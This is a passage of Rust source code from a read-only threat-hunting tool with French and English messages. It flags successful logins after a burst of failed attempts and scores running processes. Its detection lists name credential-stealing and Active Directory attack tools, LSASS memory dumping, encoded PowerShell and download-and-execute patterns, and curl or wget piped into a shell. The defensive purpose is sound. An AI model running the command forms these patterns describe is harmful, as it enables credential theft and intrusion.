//! Chasse aux menaces, en direct : ce qu'un intrus laisse voir pendant qu'il est là, quand l'antivirus ne l'a pas
//! reconnu. Deux signes. Une connexion réussie depuis une adresse qui venait de rater des mots de passe en rafale :
//! le plus grave, un mot de passe deviné. Des programmes en marche qui ont la forme d'une attaque : outil offensif
//! connu, ligne de commande qui télécharge ou cache ce qu'elle exécute, programme lancé d'un dossier où rien ne
//! s'installe. Chaque signe se juge par une fonction pure, testée sous Linux et sous Wine ; la lecture (journaux,
//! processus) est propre à chaque système. Lecture seule : rien n'est arrêté, rien n'est envoyé.

use std::collections::{HashMap, HashSet};
use std::net::IpAddr;

use super::regles::{Os, regle};
use super::{Constat, alerte, impossible, ok};
use crate::risk::Niveau;
use crate::ui::{affichable, resume};
use crate::{tr, trf};

regle!(
    "COM-CPT-003",
    Os::Tous,
    605,
    (
        "connexion réussie après une rafale d'échecs",
        "successful sign-in after a burst of failures"
    ),
    &["MITRE ATT&CK T1110.001", "MITRE ATT&CK T1078"],
    connexion_forcee
);

regle!(
    "COM-PRG-001",
    Os::Tous,
    675,
    ("programmes en marche suspects", "suspicious running programs"),
    &[
        "MITRE ATT&CK T1059.001",
        "MITRE ATT&CK T1218",
        "MITRE ATT&CK T1105",
        "MITRE ATT&CK T1003.001",
        "MITRE ATT&CK T1496",
        "MITRE ATT&CK T1204.002",
    ],
    programmes_suspects
);

// ───────────────────────────── Mot de passe deviné ─────────────────────────────

/// Échecs depuis une même adresse à partir desquels une connexion qui réussit ensuite n'est plus une faute de frappe.
pub(crate) const SEUIL_ECHECS: usize = 10;

/// Une tentative de connexion lue dans un journal, dans l'ordre où elle a eu lieu.
#[derive(Clone, Debug)]
pub(crate) struct Tentative {
    pub adresse: IpAddr,
    /// Le compte, pour une connexion réussie (celui d'un échec ne sert pas).
    pub compte: String,
    pub reussie: bool,
}

/// Une connexion réussie depuis une adresse qui avait raté au moins `SEUIL_ECHECS` fois avant elle.
#[derive(Debug, PartialEq, Eq)]
pub(crate) struct Intrusion {
    pub adresse: IpAddr,
    pub compte: String,
    pub echecs: usize,
}

/// Les connexions réussies depuis une adresse qui avait raté au moins `SEUIL_ECHECS` fois avant elle : une par adresse
/// et par compte, dans l'ordre. La machine elle-même (127.0.0.1, ::1) n'est pas une source : un programme d'ici qui
/// garde un vieux mot de passe n'est pas une intrusion.
pub(crate) fn intrusions(tentatives: &[Tentative]) -> Vec<Intrusion> {
    let mut echecs: HashMap<IpAddr, usize> = HashMap::new();
    let mut trouvees: Vec<Intrusion> = Vec::new();
    for t in tentatives
        .iter()
        .filter(|t| !t.adresse.is_loopback() && !t.adresse.is_unspecified())
    {
        let n = echecs.entry(t.adresse).or_default();
        if !t.reussie {
            *n += 1;
        } else if *n >= SEUIL_ECHECS && !trouvees.iter().any(|i| i.adresse == t.adresse && i.compte == t.compte) {
            trouvees.push(Intrusion {
                adresse: t.adresse,
                compte: t.compte.clone(),
                echecs: *n,
            });
        }
    }
    trouvees
}

/// Les comptes touchés, montrés inoffensifs : le nom vient du journal.
fn comptes(intrusions: &[Intrusion]) -> String {
    let mut noms: Vec<String> = intrusions.iter().map(|i| affichable(&i.compte)).collect();
    noms.sort();
    noms.dedup();
    noms.join(", ")
}

/// Que faire : le mot de passe d'abord, puis fermer la porte, puis l'enquête. La porte est le Bureau à distance sous
/// Windows ; ailleurs, la connexion par mot de passe de SSH (les clés seules), et recharger sshd ne coupe pas les
/// connexions en cours.
fn conseil(systeme: Os, comptes: &str) -> String {
    match systeme {
        Os::Windows => trf!(
            "Change tout de suite le mot de passe de {comptes}, coupe le Bureau à distance s'il ne sert pas, et regarde ce qui s'est passé : vanguard traces",
            "Change the password of {comptes} right away, turn off Remote Desktop if it is not used, and look at what happened: vanguard traces"
        ),
        Os::Linux | Os::MacOs | Os::Tous => trf!(
            "Change tout de suite le mot de passe de {comptes} (passwd), coupe la connexion par mot de passe de SSH (PasswordAuthentication no, puis recharger sshd), et regarde ce qui s'est passé : vanguard traces",
            "Change the password of {comptes} right away (passwd), turn off password sign-in for SSH (PasswordAuthentication no, then reload sshd), and look at what happened: vanguard traces"
        ),
    }
}

/// Le constat des connexions réussies après une rafale d'échecs, avec le conseil de ce système.
pub(crate) fn juger_intrusions(intrusions: &[Intrusion], systeme: Os) -> Constat {
    if intrusions.is_empty() {
        return ok(
            "Comptes",
            trf!(
                "Aucune connexion réussie depuis une adresse qui venait de rater au moins {SEUIL_ECHECS} fois.",
                "No successful sign-in from an address that had just failed at least {SEUIL_ECHECS} times."
            ),
        );
    }
    let liste: Vec<String> = intrusions
        .iter()
        .map(|i| {
            trf!(
                "depuis {} sur le compte {} après {} échecs",
                "from {} on the account {} after {} failures",
                i.adresse,
                affichable(&i.compte),
                i.echecs
            )
        })
        .collect();
    let mut texte = trf!(
        "Connexion réussie {} : un mot de passe a sans doute été deviné.",
        "Successful sign-in {}: a password was most likely guessed.",
        resume(&liste, 3, tr!(" ; ", "; "))
    );
    if !intrusions
        .iter()
        .any(|i| crate::protection::sortantes::sur_internet(i.adresse))
    {
        texte.push_str(tr!(
            " L'adresse est sur le réseau local : un appareil de la maison qui gardait un vieux mot de passe l'explique aussi.",
            " The address is on the local network: a device at home that kept an old password also explains it."
        ));
    }
    alerte("Comptes", Niveau::Critique, texte).manuel(conseil(systeme, &comptes(intrusions)), &["vanguard traces"])
}

/// La vérification : les tentatives lues dans le journal du système, jugées. Rien sans serveur à surveiller ; un
/// journal qui ne se lit pas le dit (non vérifié, jamais sain).
fn connexion_forcee() -> Vec<Constat> {
    match tentatives_lues() {
        None => Vec::new(),
        Some(Err(refus)) => vec![refus],
        Some(Ok(tentatives)) => vec![juger_intrusions(&intrusions(&tentatives), Os::actuel())],
    }
}

/// Sous Linux : le journal de sshd des dernières 24 h.
#[cfg(target_os = "linux")]
fn tentatives_lues() -> Option<Result<Vec<Tentative>, Constat>> {
    super::linux::tentatives_ssh_lues()
}

/// Sous Windows : le journal de la sécurité des 7 derniers jours, qui refuse sans droits d'administrateur.
#[cfg(windows)]
#[allow(clippy::unnecessary_wraps)] // même signature que sous Linux, où il peut n'y avoir aucun serveur SSH
fn tentatives_lues() -> Option<Result<Vec<Tentative>, Constat>> {
    Some(super::windows::evenements::tentatives_lues().map_err(|raison| impossible("Comptes", raison)))
}

/// Sous macOS, sshd écrit dans le journal unifié, qui ne se lit qu'en lançant « log show » (des minutes, pour une
/// journée) : non vérifié, jamais compté comme sain.
#[cfg(target_os = "macos")]
#[allow(clippy::unnecessary_wraps)] // même signature que sous Linux, où il peut n'y avoir aucun serveur SSH
fn tentatives_lues() -> Option<Result<Vec<Tentative>, Constat>> {
    Some(Err(impossible(
        "Comptes",
        tr!(
            "sshd écrit dans le journal unifié de macOS, que Vanguard ne lit pas",
            "sshd writes to macOS's unified log, which Vanguard does not read"
        ),
    )))
}

// ───────────────────────────── Programmes en marche ─────────────────────────────

/// Un programme en marche, tel que le système le donne.
#[derive(Clone, Debug, Default)]
pub(crate) struct EnMarche {
    pub pid: u32,
    pub parent: Option<u32>,
    /// Son nom : celui de son fichier sous Windows et macOS, le nom court du noyau sous Linux.
    pub nom: String,
    /// Le chemin de son programme, quand il se lit (sous Linux, ceux du compte seulement).
    pub chemin: Option<String>,
    /// Sa ligne de commande, quand elle se lit sans droits.
    pub ligne: Option<String>,
    /// Son programme n'est plus sur le disque : effacé après son lancement.
    pub sans_fichier: bool,
}

/// Un motif trouvé dans une ligne de commande : pourquoi elle est suspecte, et où il finit (en octets). Ce qui suit
/// n'est jamais montré : une adresse, un jeton ou un mot de passe peuvent y être.
#[derive(Debug, PartialEq, Eq)]
pub(crate) struct Motif {
    pub raison: &'static str,
    pub fin: usize,
}

/// Ce qui rend un programme en marche suspect : le niveau, la raison, ce qui est montré de lui (le début de sa ligne
/// de commande jusqu'au motif, ou son chemin), et si son programme a été effacé depuis son lancement.
#[derive(Debug, PartialEq, Eq)]
pub(crate) struct Soupcon {
    pub niveau: Niveau,
    pub raison: &'static str,
    pub extrait: Option<String>,
    pub efface: bool,
}

/// Ce qu'on montre au plus d'une ligne de commande ou d'un chemin, en caractères.
const LONGUEUR_EXTRAIT: usize = 60;

/// Le nom de fichier d'un chemin, quel que soit le séparateur, sans guillemets autour.
fn nom_de_fichier(chemin: &str) -> &str {
    let chemin = chemin.trim_matches(['"', '\'']);
    chemin.rsplit(['/', '\\']).next().unwrap_or(chemin)
}

/// Les mots d'un texte (séparés par des blancs), chacun avec la position, en octets, de sa fin.
fn mots(texte: &str) -> Vec<(&str, usize)> {
    let mut mots = Vec::new();
    let mut debut = None;
    for (i, c) in texte.char_indices().chain(std::iter::once((texte.len(), ' '))) {
        match (c.is_whitespace(), debut) {
            (true, Some(d)) => {
                mots.push((&texte[d..i], i));
                debut = None;
            }
            (false, None) => debut = Some(i),
            _ => {}
        }
    }
    mots
}

/// La fin (en octets) du premier `mot` de `bas` (déjà en minuscules) qui n'est pas collé à une lettre ou un chiffre :
/// « iex » dans « IEX(… » ou « | iex », pas dans « windex ».
fn fin_du_mot(bas: &str, mot: &str) -> Option<usize> {
    let lettre = |c: char| c.is_alphanumeric() || c == '_';
    bas.match_indices(mot)
        .map(|(i, _)| (i, i + mot.len()))
        .find(|&(debut, fin)| {
            !bas[..debut].chars().next_back().is_some_and(lettre) && !bas[fin..].chars().next().is_some_and(lettre)
        })
        .map(|(_, fin)| fin)
}

/// Les détournements connus d'un outil livré avec Windows (« LOLBin ») : PowerShell qui exécute une commande cachée en
/// base64 ou du texte téléchargé, mshta, regsvr32 et rundll32 qui lancent un script venu d'Internet, certutil et
/// bitsadmin qui téléchargent ou décodent un fichier. `programme` : son nom de fichier en minuscules, sans « .exe » ;
/// `args` : ses arguments tels quels. `None` : l'usage ordinaire de ces outils (PowerShell seul n'a rien de suspect).
pub(crate) fn detournement(programme: &str, args: &str) -> Option<Motif> {
    // Minuscules ASCII seulement : chaque position trouvée vaut dans `args`.
    let bas = args.to_ascii_lowercase();
    let mots = mots(&bas);
    // La fin du premier mot qui répond, « /x » lu comme « -x » (Windows accepte les deux).
    let option = |test: &dyn Fn(&str) -> bool| {
        mots.iter()
            .find(|(m, _)| {
                let m = m.trim_matches('"');
                match m.strip_prefix('/') {
                    Some(reste) => test(&format!("-{reste}")),
                    None => test(m),
                }
            })
            .map(|&(_, fin)| fin)
    };
    let premier = |motifs: &[&str]| motifs.iter().filter_map(|m| bas.find(m).map(|i| i + m.len())).min();
    let motif = |raison: &'static str| move |fin: usize| Motif { raison, fin };
    match programme {
        "powershell" | "pwsh" => {
            let cachee = option(&|m: &str| {
                m == "-e" || m == "-ec" || (m.starts_with("-en") && "-encodedcommand".starts_with(m))
            });
            if let Some(fin) = cachee {
                return Some(Motif {
                    raison: tr!(
                        "commande PowerShell cachée en base64",
                        "PowerShell command hidden in base64"
                    ),
                    fin,
                });
            }
            let execute = ["iex", "invoke-expression"]
                .iter()
                .filter_map(|m| fin_du_mot(&bas, m))
                .min();
            let telecharge = fin_du_mot(&bas, "downloadstring");
            let raison = match (execute, telecharge) {
                (Some(_), Some(_)) => tr!(
                    "télécharge un script et l'exécute aussitôt",
                    "downloads a script and runs it right away"
                ),
                (Some(_), None) => tr!(
                    "PowerShell exécute du texte comme une commande (Invoke-Expression)",
                    "PowerShell runs text as a command (Invoke-Expression)"
                ),
                (None, Some(_)) => tr!(
                    "PowerShell télécharge un script (DownloadString)",
                    "PowerShell downloads a script (DownloadString)"
                ),
                (None, None) => return None,
            };
            execute.into_iter().chain(telecharge).min().map(motif(raison))
        }
        "mshta" => premier(&["http:", "https:", "javascript:", "vbscript:"]).map(motif(tr!(
            "mshta lance un script venu d'Internet",
            "mshta runs a script from the Internet"
        ))),
        "regsvr32" => premier(&["/i:http", "-i:http", "scrobj.dll"]).map(motif(tr!(
            "regsvr32 charge un script distant",
            "regsvr32 loads a remote script"
        ))),
        "rundll32" => {
            premier(&["javascript:"]).map(motif(tr!("rundll32 exécute du JavaScript", "rundll32 runs JavaScript")))
        }
        "certutil" => option(&|m: &str| m == "-urlcache" || m == "-decode").map(motif(tr!(
            "certutil détourné pour télécharger ou décoder un fichier",
            "certutil misused to download or decode a file"
        ))),
        "bitsadmin" => option(&|m: &str| m == "-transfer").map(motif(tr!(
            "bitsadmin détourné pour télécharger un fichier",
            "bitsadmin misused to download a file"
        ))),
        _ => None,
    }
}

/// Les morceaux d'une ligne de commande séparés par un tube « | » (pas « || », le « ou » du shell), chacun avec sa
/// position de début.
fn morceaux_du_tube(ligne: &str) -> Vec<(usize, &str)> {
    let octets = ligne.as_bytes();
    let mut morceaux = Vec::new();
    let mut debut = 0;
    for (i, &o) in octets.iter().enumerate() {
        let seul = o == b'|' && (i == 0 || octets[i - 1] != b'|') && octets.get(i + 1) != Some(&b'|');
        if seul {
            morceaux.push((debut, &ligne[debut..i]));
            debut = i + 1;
        }
    }
    morceaux.push((debut, &ligne[debut..]));
    morceaux
}

/// Un script téléchargé (curl, wget) ou décodé (base64 -d) passé aussitôt à un interpréteur par un tube : ce qui
/// s'exécute ne touche jamais le disque. La fin du motif est celle du mot curl ou wget, ou de l'option de base64 :
/// l'adresse qui suit, qui peut porter un jeton, n'est pas montrée.
pub(crate) fn passe_a_un_shell(ligne: &str) -> Option<Motif> {
    const INTERPRETES: [&str; 8] = ["sh", "bash", "zsh", "dash", "ksh", "python", "python3", "perl"];
    let bas = ligne.to_ascii_lowercase();
    let morceaux = morceaux_du_tube(&bas);
    // Le programme qui reçoit un morceau, sudo et ses options passés.
    let interprete = |morceau: &str| {
        morceau
            .split_whitespace()
            .find(|m| *m != "sudo" && !m.starts_with('-'))
            .is_some_and(|p| INTERPRETES.contains(&nom_de_fichier(p)))
    };
    for (k, (debut, morceau)) in morceaux.iter().enumerate() {
        if !morceaux[k + 1..].iter().any(|(_, suite)| interprete(suite)) {
            continue;
        }
        let mots = mots(morceau);
        if let Some(&(_, fin)) = mots.iter().find(|(m, _)| ["curl", "wget"].contains(&nom_de_fichier(m))) {
            return Some(Motif {
                raison: tr!(
                    "télécharge un script et l'exécute aussitôt",
                    "downloads a script and runs it right away"
                ),
                fin: debut + fin,
            });
        }
        if let Some(i) = mots.iter().position(|(m, _)| nom_de_fichier(m) == "base64")
            && let Some(&(_, fin)) = mots[i + 1..].iter().find(|(m, _)| matches!(*m, "-d" | "--decode"))
        {
            return Some(Motif {
                raison: tr!(
                    "commande cachée en base64, exécutée aussitôt",
                    "command hidden in base64, run right away"
                ),
                fin: debut + fin,
            });
        }
    }
    None
}

/// Le bout d'un texte montré : inoffensif, et pas plus de `LONGUEUR_EXTRAIT` caractères. Trop long, c'est le début qui
/// tombe : la fin d'un extrait de ligne de commande est le motif, la fin d'un chemin le programme. `suite` : le texte
/// continuait, coupé exprès.
fn extrait(texte: &str, suite: bool) -> String {
    let texte = affichable(texte.trim());
    let caracteres: Vec<char> = texte.chars().collect();
    let mut montre = if caracteres.len() > LONGUEUR_EXTRAIT {
        let garde: String = caracteres[caracteres.len() - (LONGUEUR_EXTRAIT - 1)..].iter().collect();
        format!("…{garde}")
    } else {
        texte
    };
    if suite {
        montre.push('…');
    }
    montre
}

/// Une ligne de commande qui télécharge ou cache ce qu'elle exécute : sa raison, et son début jusqu'au motif.
pub(crate) fn commande_suspecte(ligne: &str) -> Option<(&'static str, String)> {
    // Le programme se lit de deux façons : un chemin à espaces sans guillemets (« C:\Program Files\…\x.exe -a »)
    // demande `decouper_commande`, qui coupe au premier « .exe » ; mais « certutil -decode a.txt a.exe », tapé sans
    // « .exe » au programme, se coupe au premier blanc.
    let ligne = ligne.trim();
    let au_premier_blanc = ligne
        .split_once(char::is_whitespace)
        .map_or((ligne, ""), |(e, a)| (e, a.trim_start()));
    let au_premier_blanc = (au_premier_blanc.0.to_string(), au_premier_blanc.1.to_string());
    for (exe, args) in [crate::commande::decouper_commande(ligne), au_premier_blanc] {
        let fichier = nom_de_fichier(&exe);
        let programme = fichier.to_ascii_lowercase();
        let programme = programme.strip_suffix(".exe").unwrap_or(&programme);
        if let Some(m) = detournement(programme, &args) {
            let debut = args.get(..m.fin).unwrap_or(&args);
            return Some((m.raison, extrait(&format!("{fichier} {debut}"), m.fin < args.len())));
        }
    }
    let m = passe_a_un_shell(ligne)?;
    let debut = ligne.get(..m.fin).unwrap_or(ligne);
    Some((m.raison, extrait(debut, m.fin < ligne.trim_end().len())))
}

/// Un outil offensif connu, reconnu au nom de son fichier : voleurs de mots de passe, outils d'attaque d'Active
/// Directory, mineur de cryptomonnaie, copie de la mémoire de LSASS. `noms` : le nom du processus, celui de son
/// fichier, et pour un interpréteur (Python, PowerShell…) chaque mot de sa ligne de commande, où est le script.
fn outil_offensif(noms: &[&str], ligne: &str) -> Option<&'static str> {
    let bas = ligne.to_ascii_lowercase();
    for nom in noms {
        let n = nom_de_fichier(nom).to_ascii_lowercase();
        let est = |outil: &str| n.starts_with(outil) || (outil == "mimikatz" && n.contains("invoke-mimikatz"));
        let raison = if est("mimikatz") {
            tr!(
                "voleur de mots de passe connu (Mimikatz)",
                "known password stealer (Mimikatz)"
            )
        } else if est("rubeus") {
            tr!(
                "outil connu d'attaque de Kerberos (Rubeus)",
                "known Kerberos attack tool (Rubeus)"
            )
        } else if est("sharphound") {
            tr!(
                "outil connu de reconnaissance d'Active Directory (SharpHound)",
                "known Active Directory reconnaissance tool (SharpHound)"
            )
        } else if est("lazagne") {
            tr!(
                "voleur de mots de passe connu (LaZagne)",
                "known password stealer (LaZagne)"
            )
        } else if est("xmrig") {
            tr!(
                "mineur de cryptomonnaie connu (XMRig)",
                "known cryptocurrency miner (XMRig)"
            )
        } else if est("procdump") && bas.contains("lsass") {
            tr!(
                "copie la mémoire de LSASS, où sont les mots de passe (procdump)",
                "copies the memory of LSASS, where the passwords are (procdump)"
            )
        } else {
            continue;
        };
        return Some(raison);
    }
    None
}

/// Le dossier d'où un programme ne devrait pas tourner : temporaire, Téléchargements, Public, corbeille. Un vrai
/// programme s'installe d'abord. Sous Linux, /tmp, /var/tmp et /dev/shm sont déjà jugés par la règle des programmes
/// sans fichier (LNX-PRS-004) : pas deux fois.
pub(crate) fn dossier_douteux(chemin: &str, systeme: Os) -> Option<&'static str> {
    let c = chemin.to_lowercase().replace('\\', "/");
    let dans = |d: &str| c.contains(d);
    // macOS lance une application téléchargée, pas encore déplacée, depuis une copie à part (AppTranslocation) rangée
    // dans le dossier temporaire du compte : elle vient de Téléchargements.
    if dans("/downloads/") || dans("/téléchargements/") || dans("/apptranslocation/") {
        return Some(tr!("lancé depuis Téléchargements", "started from Downloads"));
    }
    let temporaire = match systeme {
        Os::Windows => dans("/appdata/local/temp/") || dans("/windows/temp/"),
        Os::MacOs => {
            ["/tmp/", "/private/tmp/", "/var/tmp/", "/private/var/tmp/"]
                .iter()
                .any(|d| c.starts_with(d))
                || temporaire_du_compte_macos(&c)
        }
        Os::Linux | Os::Tous => false,
    };
    if temporaire {
        return Some(tr!(
            "lancé depuis un dossier temporaire",
            "started from a temporary folder"
        ));
    }
    if dans("/users/public/") || (systeme == Os::MacOs && dans("/users/shared/")) {
        return Some(tr!("rangé dans le dossier Public", "stored in the Public folder"));
    }
    if dans("/$recycle.bin/") || dans("/.trash/") || dans("/.local/share/trash/") {
        return Some(tr!("lancé depuis la corbeille", "started from the recycle bin"));
    }
    None
}

/// Le dossier temporaire d'un compte sous macOS : /private/var/folders/<xx>/<…>/T/ (« C » et « X », à côté, sont des
/// caches où Chrome, par exemple, range une copie de lui-même).
fn temporaire_du_compte_macos(c: &str) -> bool {
    let morceaux: Vec<&str> = c.trim_start_matches("/private").split('/').collect();
    morceaux.len() > 6 && morceaux[1] == "var" && morceaux[2] == "folders" && morceaux[5] == "t"
}

/// Interpréteurs dont le vrai programme est le script en argument : un outil offensif en Python ou en PowerShell se
/// reconnaît à ce script.
const INTERPRETEURS: [&str; 8] = ["python", "perl", "ruby", "powershell", "pwsh", "dotnet", "java", "node"];

/// Un interpréteur, quelle que soit sa version (« python3.12 », « pwsh.exe »).
fn interpreteur(fichier: &str) -> bool {
    let nom = fichier.to_ascii_lowercase();
    let nom = nom.strip_suffix(".exe").unwrap_or(&nom);
    INTERPRETEURS.contains(&nom.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.'))
}

/// Le signe le plus sûr qu'un programme en marche fait partie d'une attaque, ou `None`. Dans l'ordre : un outil
/// offensif connu, une ligne de commande qui télécharge ou cache ce qu'elle exécute, puis un programme lancé d'un
/// dossier où rien ne s'installe (moyen, élevé s'il a été effacé depuis).
pub(crate) fn juger_programme(p: &EnMarche, systeme: Os) -> Option<Soupcon> {
    let ligne = p.ligne.as_deref().unwrap_or("");
    let premier = ligne.split_whitespace().next().unwrap_or("");
    let mut noms = vec![p.nom.as_str(), p.chemin.as_deref().unwrap_or(""), premier];
    if interpreteur(nom_de_fichier(premier)) || interpreteur(nom_de_fichier(&p.nom)) {
        noms.extend(ligne.split_whitespace().skip(1));
    }
    if let Some(raison) = outil_offensif(&noms, ligne) {
        return Some(Soupcon {
            niveau: Niveau::Eleve,
            raison,
            extrait: None,
            efface: false,
        });
    }
    if let Some((raison, extrait)) = commande_suspecte(ligne) {
        return Some(Soupcon {
            niveau: Niveau::Eleve,
            raison,
            extrait: Some(extrait),
            efface: false,
        });
    }
    let chemin = p.chemin.as_deref()?;
    let raison = dossier_douteux(chemin, systeme)?;
    Some(Soupcon {
        niveau: if p.sans_fichier { Niveau::Eleve } else { Niveau::Moyen },
        raison,
        extrait: Some(extrait(chemin, false)),
        efface: p.sans_fichier,
    })
}

/// Les processus de Vanguard lui-même, jamais montrés : celui-ci, ceux du même programme (une autre fenêtre, la copie
/// élevée en administrateur), et tout ce qu'ils ont lancé (PowerShell, journalctl, ps pendant le bilan).
pub(crate) fn de_vanguard(liste: &[EnMarche], moi: u32, mon_programme: Option<&str>) -> HashSet<u32> {
    let meme_programme = |c: &str| {
        mon_programme.is_some_and(|m| {
            if cfg!(windows) {
                c.eq_ignore_ascii_case(m)
            } else {
                c == m
            }
        })
    };
    let mut racines: Vec<u32> = liste
        .iter()
        .filter(|p| p.chemin.as_deref().is_some_and(meme_programme))
        .map(|p| p.pid)
        .collect();
    racines.push(moi);
    let paires: Vec<(u32, u32)> = liste.iter().filter_map(|p| Some((p.pid, p.parent?))).collect();
    let mut ecartes: HashSet<u32> = racines.iter().copied().collect();
    for racine in racines {
        ecartes.extend(crate::commande::descendants(&paires, racine));
    }
    ecartes
}

/// Un programme repéré, tel qu'il est montré : son nom (choisi par qui l'a lancé, rendu inoffensif), son numéro, la
/// raison, et ce qu'on montre de lui.
fn montrer(p: &EnMarche, s: &Soupcon) -> String {
    let efface = if s.efface {
        tr!(", effacé depuis", ", deleted since")
    } else {
        ""
    };
    let suite = s.extrait.as_deref().map(|e| format!(" ({e})")).unwrap_or_default();
    trf!(
        "« {} » (PID {}) {}{efface}{suite}",
        "“{}” (PID {}) {}{efface}{suite}",
        affichable(&p.nom),
        p.pid,
        s.raison
    )
}

/// Que faire devant un programme repéré : rien d'arrêté à la hâte (l'intrus verrait qu'il est découvert, et ses
/// traces partiraient avec lui), noter d'où il vient, puis le parcours de Vanguard après une infection.
fn conseil_programmes() -> &'static str {
    tr!(
        "Ne rien arrêter à la hâte : garder ses traces (vanguard traces note son chemin, son parent, sa ligne de commande), puis suivre Dépanner › Après une infection s'il n'est pas à toi",
        "Do not stop anything in a hurry: keep its traces (vanguard traces notes its path, parent and command line), then follow Troubleshoot › After an infection if it is not yours"
    )
}

/// Les constats d'après les programmes en marche, ceux de Vanguard (`ecartes`) mis à part. `partiel` : ce que la
/// lecture n'a pas pu voir, dit avec le constat sain.
pub(crate) fn juger_programmes(
    liste: &[EnMarche],
    systeme: Os,
    ecartes: &HashSet<u32>,
    partiel: Option<&str>,
) -> Vec<Constat> {
    let examines: Vec<&EnMarche> = liste.iter().filter(|p| !ecartes.contains(&p.pid)).collect();
    let mut reperes: Vec<(&EnMarche, Soupcon)> = examines
        .iter()
        .filter_map(|p| Some((*p, juger_programme(p, systeme)?)))
        .collect();
    reperes.sort_by_key(|(p, s)| (std::cmp::Reverse(s.niveau), p.pid));
    let mut constats = Vec::new();
    let eleves: Vec<String> = reperes
        .iter()
        .filter(|(_, s)| s.niveau == Niveau::Eleve)
        .map(|(p, s)| montrer(p, s))
        .collect();
    if !eleves.is_empty() {
        constats.push(
            alerte(
                "Programmes",
                Niveau::Eleve,
                trf!(
                    "Programme(s) en marche qui ont la forme d'une attaque : {}.",
                    "Running program(s) shaped like an attack: {}.",
                    resume(&eleves, 4, tr!(" ; ", "; "))
                ),
            )
            .manuel(
                conseil_programmes(),
                &["vanguard traces", "vanguard depanner infection"],
            ),
        );
    }
    let moyens: Vec<String> = reperes
        .iter()
        .filter(|(_, s)| s.niveau == Niveau::Moyen)
        .map(|(p, s)| montrer(p, s))
        .collect();
    if !moyens.is_empty() {
        constats.push(
            alerte(
                "Programmes",
                Niveau::Moyen,
                trf!(
                    "Programme(s) en marche depuis un dossier où rien ne s'installe : {}. Un installateur en cours l'explique ; sinon, c'est un programme déposé là.",
                    "Program(s) running from a folder where nothing gets installed: {}. An installer in progress explains it; otherwise, it is a program dropped there.",
                    resume(&moyens, 4, tr!(" ; ", "; "))
                ),
            )
            .manuel(conseil_programmes(), &["vanguard traces"]),
        );
    }
    if constats.is_empty() {
        let n = examines.len();
        let mut texte = trf!(
            "Aucun des {n} programmes en marche n'a la forme d'une attaque : ni outil offensif connu, ni commande qui télécharge ou cache ce qu'elle exécute, ni programme lancé d'un dossier où rien ne s'installe.",
            "None of the {n} running programs is shaped like an attack: no known offensive tool, no command that downloads or hides what it runs, no program started from a folder where nothing gets installed."
        );
        let en_partie = examines
            .iter()
            .filter(|p| p.ligne.is_none() || p.chemin.is_none())
            .count();
        if en_partie > 0 {
            texte.push(' ');
            texte.push_str(&trf!(
                "{en_partie} d'entre eux (d'autres comptes, ou protégés) ne montrent pas leur ligne de commande ou leur chemin sans droits d'administrateur : vérifiés en partie.",
                "{en_partie} of them (other accounts, or protected) do not show their command line or path without administrator rights: partly checked."
            ));
        }
        if let Some(p) = partiel {
            texte.push(' ');
            texte.push_str(p);
        }
        constats.push(ok("Programmes", texte));
    }
    constats
}

/// La vérification : les programmes en marche, lus par le système, jugés un par un.
fn programmes_suspects() -> Vec<Constat> {
    let Some((liste, partiel)) = programmes_en_marche().filter(|(l, _)| !l.is_empty()) else {
        return vec![impossible(
            "Programmes",
            tr!(
                "liste des programmes en marche illisible",
                "list of running programs unreadable"
            ),
        )];
    };
    let mon_programme = std::env::current_exe().ok().map(|c| {
        let c = c.to_string_lossy();
        c.strip_suffix(" (deleted)").unwrap_or(&c).to_string()
    });
    let ecartes = de_vanguard(&liste, std::process::id(), mon_programme.as_deref());
    juger_programmes(&liste, Os::actuel(), &ecartes, partiel)
}

/// Les programmes en marche d'après /proc, sans droits : le nom et le parent (status), la ligne de commande
/// (cmdline, lisible pour tous), le programme (exe, lisible pour ceux du compte seulement). Les fils du noyau, sans
/// programme ni ligne de commande, ne sont pas des programmes.
#[cfg(target_os = "linux")]
fn programmes_en_marche() -> Option<(Vec<EnMarche>, Option<&'static str>)> {
    use super::linux::dissimulation::{pids_listes, proc_masque};
    let pids = pids_listes()?;
    let montages = std::fs::read_to_string("/proc/self/mounts").unwrap_or_default();
    let liste = pids
        .into_iter()
        .filter_map(|pid| {
            let racine = std::path::PathBuf::from(format!("/proc/{pid}"));
            let status = std::fs::read_to_string(racine.join("status")).ok()?;
            let champ = |nom: &str| status.lines().find_map(|l| l.strip_prefix(nom)).map(str::trim);
            let nom = champ("Name:")?.to_string();
            let parent = champ("PPid:").and_then(|p| p.parse().ok());
            let ligne = std::fs::read(racine.join("cmdline"))
                .ok()
                .map(|o| {
                    o.split(|&b| b == 0)
                        .filter(|m| !m.is_empty())
                        .map(String::from_utf8_lossy)
                        .collect::<Vec<_>>()
                        .join(" ")
                })
                .filter(|l| !l.is_empty());
            let lien = std::fs::read_link(racine.join("exe"))
                .ok()
                .map(|l| l.to_string_lossy().into_owned());
            if ligne.is_none() && lien.is_none() {
                return None;
            }
            let sans_fichier = lien.as_deref().is_some_and(|l| l.ends_with(" (deleted)"));
            let chemin = lien.map(|l| l.strip_suffix(" (deleted)").map_or_else(|| l.clone(), str::to_string));
            Some(EnMarche {
                pid,
                parent,
                nom,
                chemin,
                ligne,
                sans_fichier,
            })
        })
        .collect();
    let partiel = proc_masque(&montages).then_some(tr!(
        "/proc ne montre que tes programmes (hidepid) : ceux des autres comptes ne sont pas vérifiés.",
        "/proc only shows your programs (hidepid): those of other accounts are not checked."
    ));
    Some((liste, partiel))
}

/// Les programmes en marche d'après WMI (Win32_Process : chemin et ligne de commande, ceux des autres comptes
/// seulement en administrateur), Toolhelp32 en secours, sans les lignes de commande. Un chemin que WMI ne donne pas se
/// demande au processus lui-même, ce que les droits limités permettent pour la plupart.
#[cfg(windows)]
#[allow(clippy::unnecessary_wraps)] // même signature que sous Linux et macOS, où la lecture peut échouer
fn programmes_en_marche() -> Option<(Vec<EnMarche>, Option<&'static str>)> {
    use super::windows::{processus, wmi};
    let par_wmi = wmi::requete(
        r"root\cimv2",
        "Win32_Process",
        "",
        &["ProcessId", "ParentProcessId", "Name", "ExecutablePath", "CommandLine"],
    );
    let mut liste: Vec<EnMarche> = match par_wmi {
        Some(lignes) if !lignes.is_empty() => lignes
            .iter()
            .filter_map(|p| {
                let texte = |c: &str| p[c].texte().map(str::to_string).filter(|t| !t.is_empty());
                Some(EnMarche {
                    pid: u32::try_from(p["ProcessId"].entier()?).ok()?,
                    parent: p["ParentProcessId"].entier().and_then(|n| u32::try_from(n).ok()),
                    nom: texte("Name").unwrap_or_default(),
